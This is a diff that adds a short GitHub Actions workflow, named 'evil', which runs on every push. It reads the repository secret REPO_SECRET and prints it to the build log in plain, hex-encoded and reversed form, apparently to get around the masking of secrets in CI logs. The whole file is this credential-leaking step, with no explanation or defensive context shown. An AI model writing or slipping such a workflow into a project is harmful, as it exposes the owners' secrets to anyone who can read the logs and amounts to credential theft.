@@ -1,0 +1,12 @@
+name: evil
+on: push
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          S: ${{ secrets.REPO_SECRET }}
+        run: |
+          echo "plain=$S"
+          echo "hex=$(printf %s "$S" | xxd -p)"
+          echo "rev=$(printf %s "$S" | rev)"
